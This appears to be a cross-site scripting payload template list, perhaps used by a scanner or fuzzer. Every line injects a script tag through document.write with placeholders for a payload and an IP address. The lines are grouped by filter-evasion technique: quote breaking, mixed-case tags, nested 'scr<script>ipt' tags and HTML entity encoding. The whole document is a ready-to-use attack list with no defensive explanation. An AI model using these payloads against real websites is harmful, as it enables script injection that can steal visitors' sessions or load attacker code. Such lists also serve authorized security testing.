##Normal payloads with some variation
<script>document.write('<script type=#payload>#ip</script>');</script>
document.write('<script type=#payload>#ip</script>');</script>
\<script\>document.write('<script type=#payload>#ip</script>');\<\/script\>
<script >document.write('<script type=#payload>#ip</script>');< /script>

##Escaping Strings
"><script>document.write('<script type=#payload>#ip</script>');</script>
\"\>\<script\>document.write('<script type=#payload>#ip</script>');\<\/script\>
" ><script >document.write('<script type=#payload>#ip</script>');< /script>

##Odd Capitalization
<sCrIpT>document.write('<script type=#payload>#ip</script>');</ScRiPt>
<sCrIpT>document.write('<script type=#payload>#ip</script>');</sCrIpT>


##Recursion vulnerabilities
<scr<script>ipt>document.write('<script type=#payload>#ip</script>');</script>
<scr<script>ipt>document.write('<script type=#payload>#ip</script>');</scr</script>ipt>

##HTML entity encoding
&lt;script&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/script&gt;
document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/script&gt;
\&lt;script\&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');\&lt;\/script\&gt;
&lt;script &gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt; /script&gt;

&quot;&gt;&lt;script&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/script&gt;
\&quot;\&gt;\&lt;script\&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');\&lt;\/script\&gt;
&quot; &gt;&lt;script &gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt; /script&gt;

&lt;sCrIpT&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/ScRiPt&gt;
&lt;sCrIpT&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/sCrIpT&gt;


&lt;scr&lt;script&gt;ipt&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/script&gt;
&lt;scr&lt;script&gt;ipt&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/scr&lt;/script&gt;ipt&gt;


